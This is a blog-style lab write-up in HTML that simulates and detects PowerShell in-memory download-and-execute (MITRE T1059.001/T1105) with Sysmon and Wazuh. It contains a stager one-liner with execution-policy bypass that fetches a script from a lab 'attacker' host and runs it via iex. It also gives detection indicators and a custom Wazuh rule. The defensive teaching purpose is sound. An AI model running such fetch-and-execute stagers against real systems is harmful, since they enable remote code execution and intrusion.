@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulating & Detecting PowerShell Ingress Tool Transfer (MITRE T1059.001 & T1105) // 0xRohinth CTF Writeup</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="../css/main.css">
+</head>
+<body class="hacker-bg-grid min-h-screen flex flex-col text-slate-200">
+
+    <!-- Lightbox Modal -->
+    <div id="image-lightbox" onclick="closeLightbox()">
+        <button id="lightbox-close">&times;</button>
+        <img id="lightbox-img" src="" alt="Zoomed screenshot" onclick="event.stopPropagation()">
+    </div>
+
+    <!-- Main Container -->
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8 max-w-4xl flex-grow">
+
+        <!-- Navigation Header -->
+        <header class="flex justify-between items-center py-6 border-b border-slate-800">
+            <a href="../index.html" class="flex items-center gap-2 text-xl font-bold font-mono text-white tracking-wider hover:text-cyan-400 transition-colors">
+                <span class="text-cyan-400">&gt;</span> 0xRohinth<span class="animate-pulse text-emerald-400">_</span>
+            </a>
+            <div class="flex items-center gap-4 text-sm font-mono">
+                <a href="https://0xrohinth.github.io/" target="_blank" rel="noopener" class="text-slate-400 hover:text-cyan-400 transition-colors">./portfolio</a>
+                <a href="../index.html" class="text-cyan-400 hover:text-emerald-400 transition-colors flex items-center gap-1">
+                    &larr; ./back_to_index
+                </a>
+            </div>
+        </header>
+
+        <main class="py-8">
+            <article class="mx-auto">
+                <!-- Article Header -->
+                <header class="mb-8 pb-6 border-b border-slate-800">
+                    <div class="flex items-center gap-3 mb-4">
+                        <span class="category-tag">Blue Team</span>
+                        <span class="text-xs font-mono text-slate-500">//</span>
+                        <span class="text-xs font-mono text-slate-400">3 min read</span>
+                    </div>
+
+                    <h1 class="text-3xl md:text-5xl font-extrabold text-white tracking-tight mb-4 leading-tight">
+                        Simulating & Detecting PowerShell Ingress Tool Transfer (MITRE T1059.001 & T1105)
+                    </h1>
+
+                    <div class="flex flex-wrap items-center justify-between gap-4 text-xs font-mono text-slate-400 pt-2">
+                        <div class="flex items-center gap-2">
+                            <span>PUBLISHED:</span>
+                            <span class="text-cyan-400">2026-08-04</span>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="category-tag">#PowerShell</span> <span class="category-tag">#Wazuh</span> <span class="category-tag">#Sysmon</span> <span class="category-tag">#MITRE</span> <span class="category-tag">#Detection</span>
+                        </div>
+                    </div>
+                </header>
+
+                <!-- CTF Machine Specs Box (if present) -->
+                
+    <div class="ctf-specs-grid">
+      <div class="ctf-spec-item"><span class="ctf-spec-label">PLATFORM</span><span class="ctf-spec-value">Wazuh Lab</span></div>
+      
+      
+      
+      <div class="ctf-spec-item"><span class="ctf-spec-label">DIFFICULTY</span><span class="ctf-spec-value"><span class="cyber-badge badge-diff-easy">easy</span></span></div>
+    </div>
+
+                <!-- Optional Hero Image -->
+                
+  <div class="mb-8 rounded-lg overflow-hidden border border-slate-700 shadow-xl">
+    <img src="https://cdn.pixabay.com/photo/2023/11/11/08/54/data-8380807_1280.jpg" alt="Simulating & Detecting PowerShell Ingress Tool Transfer (MITRE T1059.001 & T1105)" onclick="openLightbox(this.src)" class="w-full h-64 md:h-80 object-cover cursor-pointer hover:scale-105 transition-transform duration-300" />
+  </div>
+
+                <!-- Article Content -->
+                <div class="post-content">
+                    <h1>Simulating &amp; Detecting PowerShell Ingress Tool Transfer</h1>
+<p>In this walkthrough, we step away from basic interactive PowerShell usage to simulate a far more realistic adversary technique: downloading and executing an external PowerShell script directly in memory via an internal web server. </p>
+<p>This scenario explicitly maps to <strong>MITRE ATT&amp;CK T1059.001 (PowerShell)</strong> and <strong>T1105 (Ingress Tool Transfer)</strong>.</p>
+<hr>
+<h2>🎯 Lab Overview &amp; Attack Diagram</h2>
+<p>Our objective is to host a harmless recon script on an attacker machine, download it directly to memory on the target host, execute it, and catch the resulting telemetry in <strong>Wazuh</strong>.</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">TEXT</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-text"> Attattacker (Kali / Linux VM)                Target (Windows VM)
+┌────────────────────────────┐              ┌───────────────────┐
+│ Host a.ps1 via HTTP        │              │ Executes PowerShell│
+│ python -m http.server 80   │              │ in-memory download│
+└─────────────┬──────────────┘              └─────────┬─────────┘
+              │                                       │
+              └────────────── HTTP Request ───────────┘
+                       [http://192.168.56.20/a.ps1](http://192.168.56.20/a.ps1)
+                                                      │
+                                                      ▼
+                                            ┌───────────────────┐
+                                            │  Wazuh / Sysmon   │
+                                            │  Generates Alert  │
+                                            └───────────────────┘</code></pre>
+  </div><blockquote>
+<p><strong>Pro Tip:</strong> While you can test this using <code>127.0.0.1</code>, using a distinct second VM (e.g., Kali or Ubuntu at <code>192.168.56.20</code>) generates actual cross-network traffic, making your Sysmon and SIEM logs significantly more authentic for portfolio writeups.</p>
+</blockquote>
+<h2>🛠 Step 1: Create the Payload Script</h2>
+<p>On the attacker host, create a benign PowerShell script named <code>a.ps1</code> that performs standard host reconnaissance:</p>
+<p>PowerShell</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">CODE</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-code">Write-Host &quot;=== PowerShell Recon Test ===&quot;
+
+whoami
+hostname
+Get-Date
+Get-Process | Select-Object -First 5
+
+Write-Host &quot;=== Execution Completed ===&quot;</code></pre>
+  </div><h2>🌐 Step 2: Host the Script via HTTP</h2>
+<p>Spin up a lightweight Python HTTP server in the directory containing <code>a.ps1</code>:</p>
+<p>Bash</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">CODE</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-code">python3 -m http.server 80</code></pre>
+  </div><p>Verify reachability by opening a browser on the target machine and navigating to <code>http://192.168.56.20/a.ps1</code>.</p>
+<h2>⚡ Step 3: Execute In-Memory Download &amp; Stager</h2>
+<p>From the target Windows host, run the following execution string. This fetches the payload and evaluates it directly in memory without writing the <code>.ps1</code> file to disk:</p>
+<h3>From CMD / External Stager:</h3>
+<p>DOS</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">CODE</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-code">powershell.exe -ExecutionPolicy Bypass -Command &quot;iex (iwr [http://192.168.56.20/a.ps1](http://192.168.56.20/a.ps1) -UseBasicParsing)&quot;</code></pre>
+  </div><h3>From an Active PowerShell Session:</h3>
+<p>PowerShell</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">CODE</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-code">iex (Invoke-WebRequest [http://192.168.56.20/a.ps1](http://192.168.56.20/a.ps1) -UseBasicParsing).Content</code></pre>
+  </div><h2>🔍 Step 4: SIEM Detection &amp; Investigation</h2>
+<p>Once executed, check your <strong>Wazuh Dashboard</strong> for telemetry generated by Sysmon and Windows Event Logs.</p>
+<h3>Key Detection Indicators</h3>
+<ul>
+<li><p><strong>Process Creation</strong>: <code>powershell.exe</code> spawned with execution policy bypass flags.</p>
+</li>
+<li><p><strong>Command Line Strings</strong>: Presence of <code>Invoke-WebRequest</code>, <code>iwr</code>, or <code>iex</code> in process arguments.</p>
+</li>
+<li><p><strong>Network Connections</strong>: Outbound HTTP connections initiated by <code>powershell.exe</code> to external/internal IPs.</p>
+</li>
+<li><p><strong>Script Block Logging</strong>: Event ID <code>4104</code> capturing the full uncompiled script content.</p>
+</li>
+</ul>
+<h3>Useful Wazuh Search Queries</h3>
+<p>Filter your Wazuh discovery tab using the following terms:</p>
+<ul>
+<li><p><code>powershell.exe</code></p>
+</li>
+<li><p><code>Invoke-WebRequest</code></p>
+</li>
+<li><p><code>iwr</code></p>
+</li>
+<li><p><code>a.ps1</code></p>
+</li>
+<li><p><code>192.168.56.20</code></p>
+</li>
+</ul>
+<h2>🛡 Step 5: Custom Detection Rule Construction</h2>
+<p>If your default Wazuh rule set doesn&#39;t trigger a high-severity alert for this activity, add a custom detection rule matching the command line patterns mapped to MITRE ATT&amp;CK techniques:</p>
+<p>XML</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">CODE</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-code">&lt;group name=&quot;sysmon,powershell,attack_t1059.001,&quot;&gt;
+  &lt;rule id=&quot;100050&quot; level=&quot;10&quot;&gt;
+    &lt;if_sid&gt;61603&lt;/if_sid&gt; &lt;!-- Sysmon Event 1: Process Creation --&gt;
+    &lt;field name=&quot;win.eventdata.commandLine&quot; type=&quot;pcre2&quot;&gt;(?i)(Invoke-WebRequest|iwr).*iex&lt;/field&gt;
+    &lt;description&gt;Suspicious PowerShell Download and Execute (In-Memory Stager)&lt;/description&gt;
+    &lt;mitre&gt;
+      &lt;id&gt;T1059.001&lt;/id&gt;
+      &lt;id&gt;T1105&lt;/id&gt;
+    &lt;/mitre&gt;
+  &lt;/rule&gt;
+&lt;/group&gt;</code></pre>
+  </div>
+                </div>
+
+                <!-- Article Footer / Navigation -->
+                <footer class="mt-12 pt-8 border-t border-slate-800 flex flex-col md:flex-row justify-between items-center gap-4 text-sm font-mono">
+                    <a href="../index.html" class="text-cyan-400 hover:text-emerald-400 transition-colors">
+                        &larr; Back to all writeups
+                    </a>
+                    <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="filter-btn">
+                        Back to Top &uarr;
+                    </button>
+                </footer>
+            </article>
+        </main>
+
+        <!-- Site Footer -->
+        <footer class="mt-12 py-6 border-t border-slate-800 text-center font-mono text-xs text-slate-500">
+            <p>&copy; 2026 0xRohinth. CTF Writeup & Security Research Notes.</p>
+        </footer>
+    </div>
+
+    <!-- Scripts for Code Copy & Lightbox -->
+    <script>
+        // Lightbox Functions
+        function openLightbox(src) {
+            const lightbox = document.getElementById('image-lightbox');
+            const img = document.getElementById('lightbox-img');
+            img.src = src;
+            lightbox.classList.add('active');
+        }
+
+        function closeLightbox() {
+            document.getElementById('image-lightbox').classList.remove('active');
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeLightbox();
+        });
+
+        // Copy Code Button Handler
+        function copyCode(button) {
+            const wrapper = button.closest('.code-wrapper');
+            const codeBlock = wrapper.querySelector('code');
+            const textToCopy = codeBlock.innerText;
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = button.innerText;
+                button.innerText = 'COPIED!';
+                button.style.backgroundColor = '#3fb950';
+                button.style.color = '#0d1117';
+
+                setTimeout(() => {
+                    button.innerText = originalText;
+                    button.style.backgroundColor = '';
+                    button.style.color = '';
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy code:', err);
+            });
+        }
+    </script>
+</body>
+</html>
